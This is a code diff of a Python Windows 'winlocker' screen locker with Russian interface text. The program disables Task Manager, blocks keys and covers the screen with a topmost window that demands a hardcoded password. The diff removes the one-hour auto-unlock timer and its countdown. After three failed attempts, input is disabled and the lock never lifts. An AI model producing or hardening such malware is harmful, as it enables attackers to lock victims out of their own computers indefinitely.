@@ -6,7 +6,6 @@ import win32con
 import win32gui
 
 PASSWORD = "90481"
-LOCK_DURATION = 60 * 60          # 1 час
 MAX_ATTEMPTS = 3
 LOG_FILE = "winlocker.log"
 
@@ -75,10 +74,6 @@ def run_locker():
     disable_taskmgr()
     block_keys()
 
-    start = time.time()
-    end = start + LOCK_DURATION
-    log(f"LOCK: старт, до {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(end))}")
-
     pygame.init()
     info = pygame.display.Info()
     W, H = info.current_w, info.current_h
@@ -87,7 +82,6 @@ def run_locker():
     clock = pygame.time.Clock()
     font = pygame.font.SysFont("consolas", 28)
     big = pygame.font.SysFont("consolas", 56, bold=True)
-    timer_font = pygame.font.SysFont("consolas", 72, bold=True)
 
     hwnd = pygame.display.get_wm_info()["window"]
     win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, W, H, 0)
@@ -95,7 +89,7 @@ def run_locker():
     entered = ""
     message = "Введите пароль для разблокировки"
     locked = True
-    reason = "таймер"
+    reason = "ожидание"
     attempts_left = MAX_ATTEMPTS
     field_focused = True
     input_enabled = True
@@ -104,11 +98,6 @@ def run_locker():
     box = pygame.Rect(W//2 - box_w//2, H//2 + 80, box_w, box_h)
 
     while locked:
-        remaining = end - time.time()
-        if remaining <= 0:
-            reason = "таймер"
-            locked = False
-            break
 
         for e in pygame.event.get():
             if e.type == pygame.QUIT:
@@ -134,7 +123,7 @@ def run_locker():
                             word = "попытка" if attempts_left == 1 else "попытки"
                             message = f"Пароль указан неверно, осталось {attempts_left} {word}"
                         else:
-                            message = "Попытки исчерпаны. Ожидайте окончания таймера."
+                            message = "Попытки исчерпаны."
                             input_enabled = False
                             field_focused = False
                 elif e.key == pygame.K_BACKSPACE:
@@ -147,12 +136,6 @@ def run_locker():
         screen.fill((10, 10, 14))
         title = big.render("СИСТЕМА ЗАБЛОКИРОВАНА", True, (220, 60, 60))
         screen.blit(title, (W//2 - title.get_width()//2, H//4))
-
-        timer_txt = timer_font.render(fmt_time(remaining), True, (240, 240, 240))
-        screen.blit(timer_txt, (W//2 - timer_txt.get_width()//2, H//4 + 90))
-
-        label = font.render("до автоматической разблокировки", True, (160, 160, 170))
-        screen.blit(label, (W//2 - label.get_width()//2, H//4 + 175))
 
         msg_color = (220, 90, 90) if attempts_left == 0 else (220, 220, 220)
         msg = font.render(message, True, msg_color)
